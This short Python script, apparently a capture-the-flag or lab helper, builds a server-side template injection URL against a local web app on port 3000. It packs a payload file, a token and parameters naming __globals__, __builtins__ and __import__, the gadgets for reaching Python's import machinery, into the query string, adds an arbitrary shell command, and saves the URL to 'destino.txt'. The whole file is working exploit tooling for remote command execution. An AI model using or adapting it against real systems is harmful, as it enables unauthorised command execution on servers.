import sys
from urllib.parse import quote

token = sys.argv[1]
cmd = sys.argv[2]
payload_file = sys.argv[3] if len(sys.argv) > 3 else 'payload.txt'

payload = open(payload_file).read().strip()
url = ('http://127.0.0.1:3000/home?directory=' + quote(payload) +
       '&token=' + token +
       '&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__' +
       '&cmd=' + quote(cmd))
open('destino.txt', 'w').write(url)
print('destino.txt actualizado (' + str(len(url)) + ' chars)')
